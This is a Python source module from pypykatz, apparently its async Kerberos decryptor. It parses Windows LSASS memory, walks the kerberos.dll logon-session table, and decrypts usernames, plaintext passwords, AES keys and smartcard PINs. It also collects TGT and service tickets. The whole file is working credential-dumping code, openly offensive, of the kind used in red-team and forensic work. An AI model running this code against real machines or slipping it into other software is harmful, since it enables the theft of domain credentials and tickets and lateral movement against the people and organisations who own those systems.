#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
from typing import List
from pypykatz.commons.kerberosticket import KerberosTicket, KerberosTicketType
from pypykatz.alsadecryptor.package_commons import PackageDecryptor
from pypykatz.alsadecryptor.win_datatypes import PLIST_ENTRY, PRTL_AVL_TABLE
from pypykatz.commons.common import WindowsMinBuild
from pypykatz.commons.common import hexdump

class KerberosCredential:
	def __init__(self):
		self.credtype:str = 'kerberos'
		self.username:str = None
		self.password:str = None
		self.password_raw:bytes = b''
		self.domainname:str = None
		self.luid:int = None
		self.tickets:List[KerberosTicket] = []
		self.pin:str = None
		self.pin_raw:bytes = None
		self.cardinfo = None
		self.aes_key128 = None
		self.aes_key256 = None
		
	def __str__(self):
		t = '\t== Kerberos ==\n'
		t += '\t\tUsername: %s\n' % self.username
		t += '\t\tDomain: %s\n' % self.domainname
		if self.password is not None:
			t += '\t\tPassword: %s\n' % self.password
			t += '\t\tpassword (hex)%s\n' % self.password_raw.hex()
		if self.pin is not None:
			t += '\t\tPIN: %s\n' % self.pin
			t += '\t\tPIN (hex): %s\n' % self.pin_raw.hex()
		if self.cardinfo is not None:
			t += '\t\tCARDINFO: \n'
			t += '\t\t\tCardName: %s\n' % self.cardinfo['CardName']
			t += '\t\t\tReaderName: %s\n' % self.cardinfo['ReaderName']
			t += '\t\t\tContainerName: %s\n' % self.cardinfo['ContainerName']
			t += '\t\t\tCSPName: %s\n' % self.cardinfo['CSPName']
		if self.aes_key128:
			t += '\t\tAES128 Key: %s\n' % self.aes_key128.hex()
		if self.aes_key256:
			t += '\t\tAES256 Key: %s\n' % self.aes_key256.hex()
		# TODO: check if users actually need this.
		# I think it's not useful to print out the kerberos ticket data as string, as noone uses it directly.
		# It is better to use the -k flag an export the tickets
		#for ticket in self.tickets:
		#	t += '\t\t%s' % str(ticket).replace('\n','\n\t\t\t')[:-3]
		
		return t
		
	def to_dict(self):
		t = {}
		t['credtype'] = self.credtype
		t['username'] = self.username
		t['password'] = self.password
		t['password_raw'] = self.password_raw
		t['domainname'] = self.domainname
		t['luid'] = self.luid
		t['pin'] = self.pin
		t['pin_raw'] = self.pin_raw
		t['cardinfo'] = self.cardinfo
		t['tickets'] = []
		for ticket in self.tickets:
			t['tickets'] = ticket.to_dict()
		if self.aes_key128:
			t['aes128'] = self.aes_key128.hex()
		if self.aes_key256:
			t['aes256'] = self.aes_key256.hex()
		return t
		

class KerberosDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor, sysinfo, with_tickets = True):
		super().__init__('Kerberos', lsa_decryptor, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.with_tickets = with_tickets
		self.credentials = []
		
		self.current_ticket_type = None
		self.current_cred = None

	async def find_first_entry(self):
		position = await self.find_signature('kerberos.dll',self.decryptor_template.signature)
		ptr_entry_loc = await self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = await self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	async def handle_ticket(self, kerberos_ticket):
		try:
			kt = await KerberosTicket.aparse(kerberos_ticket, self.reader, self.decryptor_template.sysinfo, self.current_ticket_type)
			self.current_cred.tickets.append(kt)
		except Exception as e:
			raise e
	
	async def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = await self.find_first_entry()
		except Exception as e:
			self.log('Failed to find structs! Reason: %s' % e)
			return
		
		if self.sysinfo.buildnumber < WindowsMinBuild.WIN_VISTA.value:
			#TODO: fix this
			return
			await self.reader.move(entry_ptr_loc)
			entry_ptr = await PLIST_ENTRY.load(self.reader)
			await self.walk_list(entry_ptr, self.process_session_elist)
		else:
			result_ptr_list = []
			await self.reader.move(entry_ptr_value)
			avl_table = await PRTL_AVL_TABLE.load(self.reader)
			start_node = await avl_table.read(self.reader)
			await self.walk_avl(start_node.BalancedRoot.RightChild, result_ptr_list)
			
			for ptr in result_ptr_list:
				await self.log_ptr(ptr, self.decryptor_template.kerberos_session_struct.__name__)
				await self.reader.move(ptr)
				kerberos_logon_session = await self.decryptor_template.kerberos_session_struct.load(self.reader)
				await self.process_session(kerberos_logon_session)

	async def process_session_elist(self, elist):
		#TODO: fix this
		return
		await self.reader.move(elist.location)
		await self.reader.read_uint() #Flink do not remove this line!
		await self.reader.read_uint() #Blink do not remove this line!
		kerberos_logon_session = await self.decryptor_template.kerberos_session_struct.load(self.reader)
		await self.process_session(kerberos_logon_session)

	async def process_session(self, kerberos_logon_session):
		self.current_cred = KerberosCredential()
		self.current_cred.luid = kerberos_logon_session.LocallyUniqueIdentifier
		
		self.current_cred.username = await kerberos_logon_session.credentials.UserName.read_string(self.reader)
		self.current_cred.domainname = await kerberos_logon_session.credentials.Domaine.read_string(self.reader)

		#### key list (still in session) this is not a linked list (thank god!)
		if kerberos_logon_session.pKeyList.value != 0:
			key_list = await kerberos_logon_session.pKeyList.read(self.reader, override_finaltype = self.decryptor_template.keys_list_struct)
			await key_list.read(self.reader, self.decryptor_template.hash_password_struct)
			
			for key in key_list.KeyEntries:
				if key.generic.Size > 0:
					if key.generic.Size <= 24: # AES128
						keydata = await key.generic.Checksump.read_raw(self.reader, key.generic.Size)
						if keydata:
							dec_key, _ = self.decrypt_password(keydata, bytes_expected=True)
							if dec_key:
								self.current_cred.aes_key128 = dec_key
					elif key.generic.Size <= 32: # AES256
						keydata = await key.generic.Checksump.read_raw(self.reader, key.generic.Size)
						if keydata:
							dec_key, _ = self.decrypt_password(keydata, bytes_expected=True)
							if dec_key:
								self.current_cred.aes_key256 = dec_key

		
		if kerberos_logon_session.credentials.Password.Length != 0:
			pwdata = await kerberos_logon_session.credentials.Password.read_maxdata(self.reader)
			if self.current_cred.username.endswith('$') is True:
				self.current_cred.password, self.current_cred.password_raw = self.decrypt_password(pwdata, bytes_expected=True)
				if self.current_cred.password is not None:
					self.current_cred.password = self.current_cred.password.hex()
			else:
				self.current_cred.password, self.current_cred.password_raw = self.decrypt_password(pwdata)
		
		if kerberos_logon_session.SmartcardInfos.value != 0:
			csp_info = await kerberos_logon_session.SmartcardInfos.read(self.reader, override_finaltype = self.decryptor_template.csp_info_struct)
			pin_enc = await csp_info.PinCode.read_maxdata(self.reader)
			self.current_cred.pin, raw_dec = self.decrypt_password(pin_enc)
			if csp_info.CspDataLength != 0:
				self.current_cred.cardinfo = csp_info.CspData.get_infos()

		
		if self.with_tickets is True:
			if kerberos_logon_session.Tickets_1.Flink.value != 0 and \
					kerberos_logon_session.Tickets_1.Flink.value != kerberos_logon_session.Tickets_1.Flink.location and \
						kerberos_logon_session.Tickets_1.Flink.value != kerberos_logon_session.Tickets_1.Flink.location - 4 :
				self.current_ticket_type = KerberosTicketType.TGS
				await self.walk_list(kerberos_logon_session.Tickets_1.Flink, self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
			
			if kerberos_logon_session.Tickets_2.Flink.value != 0 and \
					kerberos_logon_session.Tickets_2.Flink.value != kerberos_logon_session.Tickets_2.Flink.location and \
						kerberos_logon_session.Tickets_2.Flink.value != kerberos_logon_session.Tickets_2.Flink.location - 4 :
				self.current_ticket_type = KerberosTicketType.CLIENT
				await self.walk_list(kerberos_logon_session.Tickets_2.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
			
			if kerberos_logon_session.Tickets_3.Flink.value != 0 and \
					kerberos_logon_session.Tickets_3.Flink.value != kerberos_logon_session.Tickets_3.Flink.location and \
						kerberos_logon_session.Tickets_3.Flink.value != kerberos_logon_session.Tickets_3.Flink.location - 4 :
				self.current_ticket_type = KerberosTicketType.TGT
				await self.walk_list(kerberos_logon_session.Tickets_3.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
			self.current_ticket_type = None
		
		self.credentials.append(self.current_cred)
	
	